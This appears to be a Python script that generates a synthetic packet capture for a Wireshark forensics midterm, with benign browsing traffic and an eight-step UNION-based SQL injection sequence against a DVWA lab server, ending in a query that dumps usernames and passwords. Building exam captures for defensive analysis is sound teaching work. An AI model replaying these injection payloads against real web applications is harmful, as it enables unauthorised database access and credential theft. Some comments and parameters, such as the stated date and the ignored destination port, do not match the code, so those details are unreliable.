#!/usr/bin/env python3
"""
Week10 Midterm Exam — PCAP Generator

Generates exam-midterm.pcap for the Wireshark analysis task.

Scenario:
  - Normal HTTP browsing baseline (attacker IP: 10.10.10.50 poses as python-requests)
  - SQL Injection attack sequence via HTTP GET (UNION-based, 8 steps)
  - Attacker completes the attack and attempts login

Traffic timeline:
  Phase 1 (08:30–08:34): Normal traffic from 192.168.1.10
  Phase 2 (08:35:00–08:35:10): Attacker 10.10.10.50 reconnaissance
  Phase 3 (08:40:00–08:41:12): SQL Injection attack sequence
  Phase 4 (08:41:20+): Normal traffic resumes

Usage: python week10_midterm/dataset/generate_exam_pcap.py
Run from: teaching-assets/ directory
Requires: scapy (pip install scapy)
"""

import struct
from scapy.all import (
    Ether, IP, TCP, Raw, wrpcap
)

OUTPUT = "week10_midterm/dataset/exam-midterm.pcap"

NORMAL_IP_1  = "192.168.1.10"
ATTACKER_IP  = "10.10.10.50"
SERVER_IP    = "192.168.1.100"
GATEWAY_MAC  = "52:54:00:12:34:56"
CLIENT_MAC_N = "08:00:27:ab:cd:ef"
CLIENT_MAC_A = "08:00:27:ff:11:22"

ts_base = 1749518400.0  # 2026-06-10 08:30:00 UTC

def ts(offset):
    return ts_base + offset

def make_tcp_session(src_ip, dst_ip, src_mac, sport, payload_bytes, time_offset):
    """Build a minimal TCP session: SYN, SYN-ACK, PSH (request), FIN."""
    pkts = []
    seq_c = 1000
    seq_s = 5000

    def pkt(src, dst, sport, dport, flags, seq, ack, data=b""):
        p = Ether(src=src_mac, dst=GATEWAY_MAC) / \
            IP(src=src, dst=dst, ttl=64) / \
            TCP(sport=sport, dport=80, flags=flags, seq=seq, ack=ack)
        if data:
            p = p / Raw(load=data)
        return p

    syn = pkt(src_ip, dst_ip, sport, 80, "S", seq_c, 0)
    syn.time = ts(time_offset)
    pkts.append(syn)

    synack = pkt(dst_ip, src_ip, 80, sport, "SA", seq_s, seq_c + 1)
    synack.time = ts(time_offset + 0.01)
    pkts.append(synack)

    req = pkt(src_ip, dst_ip, sport, 80, "PA", seq_c + 1, seq_s + 1, payload_bytes)
    req.time = ts(time_offset + 0.05)
    pkts.append(req)

    resp_body = b"<html><body>DVWA Response</body></html>"
    http_resp = (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
                 b"Content-Length: " + str(len(resp_body)).encode() + b"\r\n\r\n" + resp_body)
    resp = pkt(dst_ip, src_ip, 80, sport, "PA", seq_s + 1, seq_c + 1 + len(payload_bytes), http_resp)
    resp.time = ts(time_offset + 0.08)
    pkts.append(resp)

    fin = pkt(src_ip, dst_ip, sport, 80, "FA", seq_c + 1 + len(payload_bytes),
              seq_s + 1 + len(http_resp))
    fin.time = ts(time_offset + 0.10)
    pkts.append(fin)

    return pkts

pkt_list = []

# --- Phase 1: Normal traffic (192.168.1.10) ---
normal_requests = [
    "/index.php",
    "/login.php",
    "/vulnerabilities/",
]

normal_ua = b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0"

for i, path in enumerate(normal_requests):
    req_bytes = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {SERVER_IP}\r\n"
        f"User-Agent: {normal_ua.decode()}\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()
    pkt_list += make_tcp_session(NORMAL_IP_1, SERVER_IP, CLIENT_MAC_N,
                                 50100 + i, req_bytes, i * 60)

# --- Phase 2: Attacker reconnaissance ---
recon_requests = [
    "/",
    "/robots.txt",
    "/vulnerabilities/sqli/",
]

attacker_ua = b"python-requests/2.31.0"

for i, path in enumerate(recon_requests):
    req_bytes = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {SERVER_IP}\r\n"
        f"User-Agent: {attacker_ua.decode()}\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()
    pkt_list += make_tcp_session(ATTACKER_IP, SERVER_IP, CLIENT_MAC_A,
                                 51000 + i, req_bytes, 300 + i * 3)

# --- Phase 3: SQL Injection attack sequence ---
# UNION-based SQLi against DVWA sqli endpoint
sqli_payloads = [
    "/vulnerabilities/sqli/?id=1'&Submit=Submit",
    "/vulnerabilities/sqli/?id=1+OR+1%3D1--&Submit=Submit",
    "/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit",
    "/vulnerabilities/sqli/?id=1'+UNION+SELECT+NULL--&Submit=Submit",
    "/vulnerabilities/sqli/?id=1'+UNION+SELECT+NULL,NULL--&Submit=Submit",
    "/vulnerabilities/sqli/?id=1'+UNION+SELECT+1,database()--+&Submit=Submit",
    "/vulnerabilities/sqli/?id=1'+UNION+SELECT+1,group_concat(table_name)+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()--+&Submit=Submit",
    "/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+&Submit=Submit",
]

for i, path in enumerate(sqli_payloads):
    req_bytes = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {SERVER_IP}\r\n"
        f"User-Agent: {attacker_ua.decode()}\r\n"
        f"Cookie: PHPSESSID=abc123; security=low\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()
    pkt_list += make_tcp_session(ATTACKER_IP, SERVER_IP, CLIENT_MAC_A,
                                 52000 + i, req_bytes, 600 + i * 9)

# --- Phase 4: Normal traffic resumes ---
for i, path in enumerate(["/about.php", "/contact.php"]):
    req_bytes = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {SERVER_IP}\r\n"
        f"User-Agent: {normal_ua.decode()}\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()
    pkt_list += make_tcp_session(NORMAL_IP_1, SERVER_IP, CLIENT_MAC_N,
                                 50200 + i, req_bytes, 700 + i * 30)

# --- Write PCAP ---
import os
os.makedirs("week10_midterm/dataset", exist_ok=True)

pkt_list.sort(key=lambda p: float(p.time))
wrpcap(OUTPUT, pkt_list)
print(f"Written {len(pkt_list)} packets to {OUTPUT}")

# --- Quick verification ---
from scapy.all import rdpcap
pkts = rdpcap(OUTPUT)
http_reqs = [p for p in pkts if p.haslayer(Raw) and b"GET /" in bytes(p[Raw])]
sqli_pkts = [p for p in pkts if p.haslayer(Raw) and b"UNION+SELECT" in bytes(p[Raw])]
attacker_pkts = [p for p in pkts if IP in p and p[IP].src == ATTACKER_IP]

print(f"\nVerification:")
print(f"  Total packets:       {len(pkts)}")
print(f"  HTTP GET requests:   {len(http_reqs)}")
print(f"  SQLi packets:        {len(sqli_pkts)}")
print(f"  Attacker packets:    {len(attacker_pkts)}")
print(f"\nAttacker IP:          {ATTACKER_IP}")
print(f"SQLi payload examples:")
for p in sqli_pkts[:2]:
    raw = bytes(p[Raw])
    path_end = raw.find(b" HTTP/")
    print(f"  {raw[4:min(path_end, 80)].decode(errors='replace')}")
